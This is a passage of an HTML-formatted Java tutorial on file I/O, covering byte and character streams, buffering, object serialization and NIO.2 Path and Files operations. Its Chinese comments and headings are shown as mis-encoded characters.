    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">copyFileModern</span><span class="hljs-params">(String sourcePath, String targetPath)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(sourcePath);
             <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(targetPath)) {
            
            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">8192</span>];
            <span class="hljs-type">int</span> bytesRead;
            
            <span class="hljs-keyword">while</span> ((bytesRead = fis.read(buffer)) != -<span class="hljs-number">1</span>) {
                fos.write(buffer, <span class="hljs-number">0</span>, bytesRead);
            }
            
            System.out.println(<span class="hljs-string">"æ–‡ä»¶å¤åˆ¶å®Œæˆ"</span>);
        }
    }
    
    <span class="hljs-comment">// è¯»å–å›¾åƒæ–‡ä»¶ä¿¡æ¯</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readImageInfo</span><span class="hljs-params">(String imagePath)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(imagePath)) {
            <span class="hljs-type">byte</span>[] header = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4</span>];
            fis.read(header);
            
            <span class="hljs-comment">// ç®€å•åˆ¤æ–­æ–‡ä»¶ç±»å‹</span>
            <span class="hljs-keyword">if</span> (header[<span class="hljs-number">0</span>] == (<span class="hljs-type">byte</span>) <span class="hljs-number">0xFF</span> &amp;&amp; header[<span class="hljs-number">1</span>] == (<span class="hljs-type">byte</span>) <span class="hljs-number">0xD8</span>) {
                System.out.println(<span class="hljs-string">"JPEG å›¾åƒæ–‡ä»¶"</span>);
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (header[<span class="hljs-number">0</span>] == (<span class="hljs-type">byte</span>) <span class="hljs-string">'G'</span> &amp;&amp; header[<span class="hljs-number">1</span>] == (<span class="hljs-type">byte</span>) <span class="hljs-string">'I'</span> 
                    &amp;&amp; header[<span class="hljs-number">2</span>] == (<span class="hljs-type">byte</span>) <span class="hljs-string">'F'</span>) {
                System.out.println(<span class="hljs-string">"GIF å›¾åƒæ–‡ä»¶"</span>);
            } <span class="hljs-keyword">else</span> {
                System.out.println(<span class="hljs-string">"æœªçŸ¥æ–‡ä»¶ç±»å‹"</span>);
            }
            
            <span class="hljs-type">long</span> <span class="hljs-variable">fileSize</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(imagePath).length();
            System.out.println(<span class="hljs-string">"æ–‡ä»¶å¤§å°: "</span> + fileSize + <span class="hljs-string">" å­—èŠ‚"</span>);
        }
    }
}
</code></pre>
<h2 data-id="heading-5">å­—ç¬¦æµæ“ä½œï¼šå¤„ç†æ–‡æœ¬æ•°æ®</h2>
<h3 data-id="heading-6">FileReader å’Œ FileWriter</h3>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CharacterStreamExample</span> {
    
    <span class="hljs-comment">// è¯»å–æ–‡æœ¬æ–‡ä»¶å†…å®¹ï¼ˆå­—ç¬¦æµï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readTextFile</span><span class="hljs-params">(String filePath)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
        
        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(filePath)) {
            <span class="hljs-type">char</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">4096</span>];
            <span class="hljs-type">int</span> charsRead;
            
            <span class="hljs-keyword">while</span> ((charsRead = reader.read(buffer)) != -<span class="hljs-number">1</span>) {
                content.append(buffer, <span class="hljs-number">0</span>, charsRead);
            }
        }
        
        <span class="hljs-keyword">return</span> content.toString();
    }
    
    <span class="hljs-comment">// å†™å…¥æ–‡æœ¬æ–‡ä»¶</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeTextFile</span><span class="hljs-params">(String filePath, String content)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(filePath)) {
            writer.write(content);
        }
    }
    
    <span class="hljs-comment">// æŒ‰è¡Œè¯»å–æ–‡æœ¬æ–‡ä»¶</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;String&gt; <span class="hljs-title function_">readLines</span><span class="hljs-params">(String filePath)</span> <span class="hljs-keyword">throws</span> IOException {
        List&lt;String&gt; lines = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        
        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileReader</span> <span class="hljs-variable">fileReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(filePath);
             <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(fileReader)) {
            
            String line;
            <span class="hljs-keyword">while</span> ((line = bufferedReader.readLine()) != <span class="hljs-literal">null</span>) {
                lines.add(line);
            }
        }
        
        <span class="hljs-keyword">return</span> lines;
    }
    
    <span class="hljs-comment">// å¤„ç†ä¸åŒç¼–ç çš„æ–‡æœ¬æ–‡ä»¶</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readFileWithEncoding</span><span class="hljs-params">(String filePath, String charsetName)</span> 
            <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
        
        <span class="hljs-comment">// æŒ‡å®šç¼–ç è¯»å–æ–‡ä»¶</span>
        <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filePath), charsetName)) {
            
            <span class="hljs-type">char</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">char</span>[<span class="hljs-number">4096</span>];
            <span class="hljs-type">int</span> charsRead;
            
            <span class="hljs-keyword">while</span> ((charsRead = reader.read(buffer)) != -<span class="hljs-number">1</span>) {
                content.append(buffer, <span class="hljs-number">0</span>, charsRead);
            }
        }
        
        <span class="hljs-keyword">return</span> content.toString();
    }
}
</code></pre>
<h2 data-id="heading-7">ç¼“å†²æµï¼šæå‡I/Oæ€§èƒ½çš„å…³é”®</h2>
<h3 data-id="heading-8">ç¼“å†²æµçš„å¨åŠ›</h3>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BufferedStreamExample</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">performanceComparison</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">String</span> <span class="hljs-variable">sourceFile</span> <span class="hljs-operator">=</span> <span class="hljs-string">"largefile.dat"</span>;
        <span class="hljs-type">String</span> <span class="hljs-variable">target1</span> <span class="hljs-operator">=</span> <span class="hljs-string">"copy1.dat"</span>;
        <span class="hljs-type">String</span> <span class="hljs-variable">target2</span> <span class="hljs-operator">=</span> <span class="hljs-string">"copy2.dat"</span>;
        
        <span class="hljs-comment">// 1. æ— ç¼“å†²å¤åˆ¶</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        copyWithoutBuffer(sourceFile, target1);
        <span class="hljs-type">long</span> <span class="hljs-variable">time1</span> <span class="hljs-operator">=</span> System.currentTimeMillis() - startTime;
        
        <span class="hljs-comment">// 2. æœ‰ç¼“å†²å¤åˆ¶</span>
        startTime = System.currentTimeMillis();
        copyWithBuffer(sourceFile, target2);
        <span class="hljs-type">long</span> <span class="hljs-variable">time2</span> <span class="hljs-operator">=</span> System.currentTimeMillis() - startTime;
        
        System.out.println(<span class="hljs-string">"æ— ç¼“å†²å¤åˆ¶è€—æ—¶: "</span> + time1 + <span class="hljs-string">"ms"</span>);
        System.out.println(<span class="hljs-string">"æœ‰ç¼“å†²å¤åˆ¶è€—æ—¶: "</span> + time2 + <span class="hljs-string">"ms"</span>);
        System.out.println(<span class="hljs-string">"æ€§èƒ½æå‡: "</span> + (time1 - time2) + <span class="hljs-string">"ms"</span>);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">copyWithoutBuffer</span><span class="hljs-params">(String source, String target)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(source);
             <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(target)) {
            
            <span class="hljs-type">int</span> byteData;
            <span class="hljs-keyword">while</span> ((byteData = fis.read()) != -<span class="hljs-number">1</span>) { <span class="hljs-comment">// é€å­—èŠ‚è¯»å–ï¼Œæ•ˆç‡æä½ï¼</span>
                fos.write(byteData);
            }
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">copyWithBuffer</span><span class="hljs-params">(String source, String target)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-keyword">try</span> (<span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(source));
             <span class="hljs-type">BufferedOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(target))) {
            
            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">8192</span>];
            <span class="hljs-type">int</span> bytesRead;
            
            <span class="hljs-keyword">while</span> ((bytesRead = bis.read(buffer)) != -<span class="hljs-number">1</span>) {
                bos.write(buffer, <span class="hljs-number">0</span>, bytesRead);
            }
        }
    }
    
    <span class="hljs-comment">// å¸¦ç¼“å†²çš„å­—ç¬¦æµ</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processTextFileWithBuffer</span><span class="hljs-params">(String inputFile, String outputFile)</span> 
            <span class="hljs-keyword">throws</span> IOException {
        
        <span class="hljs-keyword">try</span> (<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(inputFile));
             <span class="hljs-type">BufferedWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(outputFile))) {
            
            String line;
            <span class="hljs-type">int</span> <span class="hljs-variable">lineNumber</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
            
            <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) {
                lineNumber++;
                <span class="hljs-comment">// å¤„ç†æ¯ä¸€è¡Œï¼Œä¾‹å¦‚æ·»åŠ è¡Œå·</span>
                <span class="hljs-type">String</span> <span class="hljs-variable">processedLine</span> <span class="hljs-operator">=</span> String.format(<span class="hljs-string">"%04d: %s"</span>, lineNumber, line);
                writer.write(processedLine);
                writer.newLine(); <span class="hljs-comment">// è·¨å¹³å°æ¢è¡Œç¬¦</span>
            }
        }
    }
}
</code></pre>
<h2 data-id="heading-9">å¯¹è±¡åºåˆ—åŒ–ï¼šä¿å­˜å’Œæ¢å¤å¯¹è±¡çŠ¶æ€</h2>
<h3 data-id="heading-10">Serializableæ¥å£</h3>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializationExample</span> {
    
    <span class="hljs-comment">// å¯åºåˆ—åŒ–çš„å¯¹è±¡</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>; <span class="hljs-comment">// åºåˆ—åŒ–ç‰ˆæœ¬å·</span>
        
        <span class="hljs-keyword">private</span> String name;
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-type">int</span> age; <span class="hljs-comment">// transientä¿®é¥°çš„å­—æ®µä¸ä¼šè¢«åºåˆ—åŒ–</span>
        <span class="hljs-keyword">private</span> List&lt;String&gt; hobbies;
        
        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age, List&lt;String&gt; hobbies)</span> {
            <span class="hljs-built_in">this</span>.name = name;
            <span class="hljs-built_in">this</span>.age = age;
            <span class="hljs-built_in">this</span>.hobbies = hobbies;
        }
        
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"Person{name='"</span> + name + <span class="hljs-string">"', age="</span> + age + 
                   <span class="hljs-string">", hobbies="</span> + hobbies + <span class="hljs-string">"}"</span>;
        }
    }
    
    <span class="hljs-comment">// åºåˆ—åŒ–å¯¹è±¡åˆ°æ–‡ä»¶</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serializeObject</span><span class="hljs-params">(Object obj, String filePath)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-keyword">try</span> (<span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(filePath))) {
            oos.writeObject(obj);
            System.out.println(<span class="hljs-string">"å¯¹è±¡åºåˆ—åŒ–å®Œæˆ: "</span> + filePath);
        }
    }
    
    <span class="hljs-comment">// ä»æ–‡ä»¶ååºåˆ—åŒ–å¯¹è±¡</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserializeObject</span><span class="hljs-params">(String filePath)</span> 
            <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException {
        
        <span class="hljs-keyword">try</span> (<span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filePath))) {
            <span class="hljs-keyword">return</span> ois.readObject();
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        List&lt;String&gt; hobbies = Arrays.asList(<span class="hljs-string">"é˜…è¯»"</span>, <span class="hljs-string">"æ¸¸æ³³"</span>, <span class="hljs-string">"ç¼–ç¨‹"</span>);
        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-number">25</span>, hobbies);
        
        <span class="hljs-comment">// åºåˆ—åŒ–</span>
        serializeObject(person, <span class="hljs-string">"person.dat"</span>);
        
        <span class="hljs-comment">// ååºåˆ—åŒ–</span>
        <span class="hljs-type">Person</span> <span class="hljs-variable">restoredPerson</span> <span class="hljs-operator">=</span> (Person) deserializeObject(<span class="hljs-string">"person.dat"</span>);
        System.out.println(<span class="hljs-string">"æ¢å¤çš„å¯¹è±¡: "</span> + restoredPerson);
        <span class="hljs-comment">// æ³¨æ„ï¼šageå­—æ®µä¸º0ï¼Œå› ä¸ºè¢«transientä¿®é¥°</span>
    }
    
    <span class="hljs-comment">// è‡ªå®šä¹‰åºåˆ—åŒ–è¿‡ç¨‹</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomSerializable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {
        <span class="hljs-keyword">private</span> String data;
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> String sensitiveData; <span class="hljs-comment">// æ•æ„Ÿæ•°æ®ï¼Œä¸ç›´æ¥åºåˆ—åŒ–</span>
        
        <span class="hljs-keyword">public</span> <span class="hljs-title function_">CustomSerializable</span><span class="hljs-params">(String data, String sensitiveData)</span> {
            <span class="hljs-built_in">this</span>.data = data;
            <span class="hljs-built_in">this</span>.sensitiveData = sensitiveData;
        }
        
        <span class="hljs-comment">// è‡ªå®šä¹‰åºåˆ—åŒ–é€»è¾‘</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(ObjectOutputStream out)</span> <span class="hljs-keyword">throws</span> IOException {
            out.defaultWriteObject(); <span class="hljs-comment">// é»˜è®¤åºåˆ—åŒ–</span>
            <span class="hljs-comment">// å¯¹æ•æ„Ÿæ•°æ®è¿›è¡ŒåŠ å¯†åå†åºåˆ—åŒ–</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">encrypted</span> <span class="hljs-operator">=</span> encrypt(sensitiveData);
            out.writeObject(encrypted);
        }
        
        <span class="hljs-comment">// è‡ªå®šä¹‰ååºåˆ—åŒ–é€»è¾‘</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> 
                <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException {
            
            in.defaultReadObject(); <span class="hljs-comment">// é»˜è®¤ååºåˆ—åŒ–</span>
            <span class="hljs-comment">// è¯»å–å¹¶è§£å¯†æ•æ„Ÿæ•°æ®</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">encrypted</span> <span class="hljs-operator">=</span> (String) in.readObject();
            <span class="hljs-built_in">this</span>.sensitiveData = decrypt(encrypted);
        }
        
        <span class="hljs-keyword">private</span> String <span class="hljs-title function_">encrypt</span><span class="hljs-params">(String data)</span> {
            <span class="hljs-comment">// ç®€å•çš„åŠ å¯†ç¤ºä¾‹ï¼ˆå®é™…é¡¹ç›®åº”ä½¿ç”¨å®‰å…¨çš„åŠ å¯†ç®—æ³•ï¼‰</span>
            <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(data.getBytes());
        }
        
        <span class="hljs-keyword">private</span> String <span class="hljs-title function_">decrypt</span><span class="hljs-params">(String encrypted)</span> {
            <span class="hljs-type">byte</span>[] bytes = Base64.getDecoder().decode(encrypted);
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes);
        }
    }
}
</code></pre>
<h2 data-id="heading-11">ç°ä»£Java I/Oï¼šNIOä¸NIO.2</h2>
<h3 data-id="heading-12">Path APIï¼šæ›´ä¼˜é›…çš„æ–‡ä»¶è·¯å¾„æ“ä½œ</h3>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ModernIOExample</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pathOperations</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. åˆ›å»ºPathå¯¹è±¡</span>
        <span class="hljs-type">Path</span> <span class="hljs-variable">path1</span> <span class="hljs-operator">=</span> Paths.get(<span class="hljs-string">"/Users/test/documents"</span>, <span class="hljs-string">"file.txt"</span>);
        <span class="hljs-type">Path</span> <span class="hljs-variable">path2</span> <span class="hljs-operator">=</span> Path.of(<span class="hljs-string">"data"</span>, <span class="hljs-string">"input"</span>, <span class="hljs-string">"config.properties"</span>);
        
        <span class="hljs-comment">// 2. è·å–è·¯å¾„ä¿¡æ¯</span>
        System.out.println(<span class="hljs-string">"æ–‡ä»¶å: "</span> + path1.getFileName());
        System.out.println(<span class="hljs-string">"çˆ¶ç›®å½•: "</span> + path1.getParent());
        System.out.println(<span class="hljs-string">"æ ¹ç›®å½•: "</span> + path1.getRoot());
        System.out.println(<span class="hljs-string">"ç»å¯¹è·¯å¾„: "</span> + path1.toAbsolutePath());
        
        <span class="hljs-comment">// 3. è·¯å¾„æ“ä½œ</span>
        <span class="hljs-type">Path</span> <span class="hljs-variable">resolved</span> <span class="hljs-operator">=</span> path2.resolve(<span class="hljs-string">"subfolder/file.txt"</span>);
        <span class="hljs-type">Path</span> <span class="hljs-variable">relativized</span> <span class="hljs-operator">=</span> path1.relativize(Paths.get(<span class="hljs-string">"/Users/test"</span>));
        <span class="hljs-type">Path</span> <span class="hljs-variable">normalized</span> <span class="hljs-operator">=</span> Paths.get(<span class="hljs-string">"/a/./b/../c"</span>).normalize();
        
        <span class="hljs-comment">// 4. æ–‡ä»¶ç³»ç»Ÿæ“ä½œ</span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// æ£€æŸ¥æ–‡ä»¶å±æ€§</span>
            <span class="hljs-type">boolean</span> <span class="hljs-variable">exists</span> <span class="hljs-operator">=</span> Files.exists(path1);
            <span class="hljs-type">boolean</span> <span class="hljs-variable">isDirectory</span> <span class="hljs-operator">=</span> Files.isDirectory(path1);
            <span class="hljs-type">boolean</span> <span class="hljs-variable">isReadable</span> <span class="hljs-operator">=</span> Files.isReadable(path1);
            <span class="hljs-type">long</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> Files.size(path1);
            <span class="hljs-type">FileTime</span> <span class="hljs-variable">lastModified</span> <span class="hljs-operator">=</span> Files.getLastModifiedTime(path1);
            
            <span class="hljs-comment">// åˆ›å»ºç›®å½•ï¼ˆåŒ…æ‹¬çˆ¶ç›®å½•ï¼‰</span>
            <span class="hljs-type">Path</span> <span class="hljs-variable">newDir</span> <span class="hljs-operator">=</span> Paths.get(<span class="hljs-string">"new/directory"</span>);
            Files.createDirectories(newDir);
            
            <span class="hljs-comment">// åˆ›å»ºæ–‡ä»¶</span>
            <span class="hljs-type">Path</span> <span class="hljs-variable">newFile</span> <span class="hljs-operator">=</span> newDir.resolve(<span class="hljs-string">"test.txt"</span>);
            Files.createFile(newFile);
            
        } <span class="hljs-keyword">catch</span> (IOException e) {
            e.printStackTrace();
        }
    }
    
    <span class="hljs-comment">// ä½¿ç”¨Filesç±»è¿›è¡Œé«˜æ•ˆæ–‡ä»¶æ“ä½œ</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">filesClassExamples</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-comment">// 1. è¯»å–æ‰€æœ‰è¡Œ</span>
        <span class="hljs-type">Path</span> <span class="hljs-variable">filePath</span> <span class="hljs-operator">=</span> Paths.get(<span class="hljs-string">"data.txt"</span>);
        List&lt;String&gt; allLines = Files.readAllLines(filePath, StandardCharsets.UTF_8);
        
        <span class="hljs-comment">// 2. æµå¼å¤„ç†å¤§æ–‡ä»¶</span>
        <span class="hljs-keyword">try</span> (Stream&lt;String&gt; lines = Files.lines(filePath, StandardCharsets.UTF_8)) {
            List&lt;String&gt; filtered = lines
                .filter(line -&gt; line.contains(<span class="hljs-string">"error"</span>))
                .collect(Collectors.toList());
            
            System.out.println(<span class="hljs-string">"æ‰¾åˆ° "</span> + filtered.size() + <span class="hljs-string">" ä¸ªé”™è¯¯è¡Œ"</span>);
        }
        
        <span class="hljs-comment">// 3. å¤åˆ¶æ–‡ä»¶</span>
        <span class="hljs-type">Path</span> <span class="hljs-variable">source</span> <span class="hljs-operator">=</span> Paths.get(<span class="hljs-string">"source.txt"</span>);
        <span class="hljs-type">Path</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> Paths.get(<span class="hljs-string">"target.txt"</span>);
        Files.copy(source, target, StandardCopyOption.REPLACE_EXISTING);
        
        <span class="hljs-comment">// 4. ç§»åŠ¨/é‡å‘½åæ–‡ä»¶</span>
        Files.move(target, Paths.get(<span class="hljs-string">"renamed.txt"</span>), 
                  StandardCopyOption.REPLACE_EXISTING);
        
        <span class="hljs-comment">// 5. åˆ é™¤æ–‡ä»¶</span>
        Files.deleteIfExists(Paths.get(<span class="hljs-string">"temp.txt"</span>));
        
        <span class="hljs-comment">// 6. éå†ç›®å½•</span>
        <span class="hljs-type">Path</span> <span class="hljs-variable">dir</span> <span class="hljs-operator">=</span> Paths.get(<span class="hljs-string">"src/main/java"</span>);
        <span class="hljs-keyword">try</span> (Stream&lt;Path&gt; paths = Files.walk(dir, <span class="hljs-number">3</span>)) { <span class="hljs-comment">// æœ€å¤§æ·±åº¦3å±‚</span>
            paths.filter(Files::isRegularFile)
                 .filter(p -&gt; p.toString().endsWith(<span class="hljs-string">".java"</span>))
                 .forEach(System.out::println);
        }
    }
    
    <span class="hljs-comment">// æ–‡ä»¶å±æ€§æ“ä½œ</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fileAttributes</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> Paths.get(<span class="hljs-string">"test.txt"</span>);
        
        <span class="hljs-comment">// åŸºæœ¬å±æ€§</span>
        <span class="hljs-type">BasicFileAttributes</span> <span class="hljs-variable">attrs</span> <span class="hljs-operator">=</span> Files.readAttributes(
            path, BasicFileAttributes.class);
        
        System.out.println(<span class="hljs-string">"åˆ›å»ºæ—¶é—´: "</span> + attrs.creationTime());
        System.out.println(<span class="hljs-string">"æœ€åè®¿é—®æ—¶é—´: "</span> + attrs.lastAccessTime());
        System.out.println(<span class="hljs-string">"æœ€åä¿®æ”¹æ—¶é—´: "</span> + attrs.lastModifiedTime());
        System.out.println(<span class="hljs-string">"æ˜¯å¦ç›®å½•: "</span> + attrs.isDirectory());
        System.out.println(<span class="hljs-string">"å¤§å°: "</span> + attrs.size() + <span class="hljs-string">" å­—èŠ‚"</span>);
        
        <span class="hljs-comment">// è®¾ç½®æ–‡ä»¶å±æ€§</span>
        Files.setAttribute(path, <span class="hljs-string">"dos:hidden"</span>, <span class="hljs-literal">true</span>);
        Files.setLastModifiedTime(path, 
            FileTime.fromMillis(System.currentTimeMillis()));
    }
}
</code></pre>
<h2 data-id="heading-13">é«˜çº§I/OæŠ€å·§ä¸å®è·µ</h2>
<h3 data-id="heading-14">1. æ–‡ä»¶é”ï¼šå¤šè¿›ç¨‹/å¤šçº¿ç¨‹å®‰å…¨è®¿é—®</h3>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileLockExample</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeWithLock</span><span class="hljs-params">(String filePath, String content)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> Paths.get(filePath);
        
